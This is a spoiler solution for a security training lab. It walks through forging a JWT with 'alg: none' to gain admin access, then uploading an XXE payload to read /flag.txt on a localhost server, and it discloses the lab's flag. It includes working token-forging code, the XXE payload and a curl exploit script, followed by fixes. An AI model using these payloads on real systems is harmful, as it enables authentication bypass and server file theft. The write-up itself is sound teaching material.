# SOLUTION — ID-Networkers Combined Lab 2: The XML Gateway

> **SPOILER WARNING** — This document contains the full solution. Attempt the lab on your own before reading.

---

## Overview

The attack chain consists of two phases:

```
Login as guest → Inspect JWT → Forge admin token (Phase 1)
                                        ↓
                              Access Admin Dashboard → Upload XXE payload → Read /flag.txt (Phase 2)
```

---

## Phase 1: JWT "None" Algorithm Bypass

### 1.1 — Log In as Guest

Navigate to `http://localhost:8000` and log in with the provided credentials:

| Field | Value |
|-------|-------|
| Username | `guest` |
| Password | `guest123` |

You will be redirected back to the login page with the message:
> Access Denied — Admin privileges required.

### 1.2 — Inspect the JWT

Open your browser's **Developer Tools** → **Application** (or **Storage**) → **Cookies**.

Find the cookie named `session_token`. Its value is a JWT in the format:

```
<header>.<payload>.<signature>
```

For example:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJndWVzdCIsInJvbGUiOiJ1c2VyIn0.<signature>
```

Decode the **header** (Base64URL):
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

Decode the **payload** (Base64URL):
```json
{
  "sub": "guest",
  "role": "user"
}
```

### 1.3 — Forge the Admin Token

The server's `verify_token()` function contains a critical vulnerability: if the JWT header specifies `"alg": "none"`, **signature verification is skipped entirely**.

**Step 1:** Create a new header with `alg` set to `none`:

```json
{"alg": "none", "typ": "JWT"}
```

Base64URL-encode it (remove trailing `=` padding):

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
```

**Step 2:** Create a new payload with admin privileges:

```json
{"sub": "admin", "role": "admin"}
```

Base64URL-encode it:

```
eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9
```

**Step 3:** Assemble the forged token. Since the algorithm is `none`, the signature section is empty (but the trailing dot is still required):

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.
```

### 1.4 — Apply the Forged Token

In your browser's Developer Tools:

1. Go to **Application** → **Cookies** → `http://localhost:8000`.
2. Find `session_token` and replace its value with the forged token above.
3. Navigate to `http://localhost:8000/dashboard`.

**You should now see the Admin Dashboard.**

### 1.5 — Quick Script (Python)

```python
import base64, json

def b64url_encode(data: dict) -> str:
    return base64.urlsafe_b64encode(
        json.dumps(data, separators=(",", ":")).encode()
    ).rstrip(b"=").decode()

header  = b64url_encode({"alg": "none", "typ": "JWT"})
payload = b64url_encode({"sub": "admin", "role": "admin"})

forged_token = f"{header}.{payload}."
print(forged_token)
```

---

## Phase 2: XXE — XML External Entity Injection

### 2.1 — Reconnaissance

On the Admin Dashboard, notice the **System Status** panel at the bottom:

| Setting | Value |
|---------|-------|
| DTD Loading | **Enabled** |
| Entity Resolution | **Enabled** |

This tells us the XML parser resolves external entities — a classic XXE vector.

### 2.2 — Craft the Malicious XML

Create a file named `exploit.xml` with the following content:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE config [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<config>
  <setting>&xxe;</setting>
</config>
```

**How it works:**

1. The `<!DOCTYPE>` declaration defines a DTD inline.
2. `<!ENTITY xxe SYSTEM "file:///flag.txt">` declares an external entity named `xxe` that reads the file `/flag.txt` from the server's filesystem.
3. `&xxe;` in the `<setting>` element is replaced by the parser with the contents of `/flag.txt`.

### 2.3 — Upload the Payload

1. On the Admin Dashboard, click the upload area and select `exploit.xml`.
2. Click **"Upload & Parse Configuration"**.

### 2.4 — Read the Flag

The result page will display the parsed XML with the entity resolved:

```xml
<config>
  <setting>FLAG{XXE_AND_JWT_CH41N3D_ATT4CK_SUCC3SS}</setting>
</config>
```

**Flag:** `FLAG{XXE_AND_JWT_CH41N3D_ATT4CK_SUCC3SS}`

---

## Full Exploit with cURL

For those who prefer the command line, here is the complete attack in two commands:

```bash
# Step 1: Generate the forged JWT
TOKEN=$(python3 -c "
import base64, json
def e(d): return base64.urlsafe_b64encode(json.dumps(d,separators=(',',':')).encode()).rstrip(b'=').decode()
print(f\"{e({'alg':'none','typ':'JWT'})}.{e({'sub':'admin','role':'admin'})}.\")")

echo "[*] Forged token: $TOKEN"

# Step 2: Upload XXE payload
cat > /tmp/xxe.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE config [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<config>
  <setting>&xxe;</setting>
</config>
EOF

curl -s http://localhost:8000/upload-xml \
  -b "session_token=$TOKEN" \
  -F "xmlfile=@/tmp/xxe.xml" | grep -oP 'FLAG\{[^}]+\}'
```

---

## Vulnerability Analysis

### JWT "None" Algorithm (CWE-287)

| Aspect | Detail |
|--------|--------|
| **Root Cause** | The server inspects the `alg` header from the *untrusted* token and skips verification when it's `"none"`. |
| **Impact** | Complete authentication bypass — any user can impersonate any role. |
| **Fix** | Always verify against a **server-side allow-list** of algorithms. Never trust the token's own `alg` claim. Use `jwt.decode(token, key, algorithms=["HS256"])` and reject anything else. |
| **Reference** | [RFC 7519 §6.1](https://datatracker.ietf.org/doc/html/rfc7519#section-6.1), [OWASP JWT Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html) |

### XXE — XML External Entity (CWE-611)

| Aspect | Detail |
|--------|--------|
| **Root Cause** | The lxml parser is configured with `resolve_entities=True` and `load_dtd=True`, allowing external entity expansion. |
| **Impact** | Arbitrary file read on the server (could also lead to SSRF, DoS via Billion Laughs, etc.). |
| **Fix** | Disable DTD loading and entity resolution: `etree.XMLParser(resolve_entities=False, load_dtd=False, no_network=True)`. Better yet, use `defusedxml`. |
| **Reference** | [OWASP XXE Prevention](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html) |

---

## Key Takeaways

1. **Never trust client-supplied algorithm headers in JWTs.** Always enforce the algorithm server-side.
2. **Disable dangerous XML parser features by default.** Use safe defaults (`resolve_entities=False`, `load_dtd=False`) or a hardened library like `defusedxml`.
3. **Vulnerability chaining** dramatically increases impact — a "low-severity" auth bypass becomes critical when it unlocks access to a vulnerable file parser.
4. **Defense in depth** matters — fixing *either* vulnerability would have prevented the full chain from succeeding.

---

*ID-Networkers Security Training Labs — Authorized Use Only*
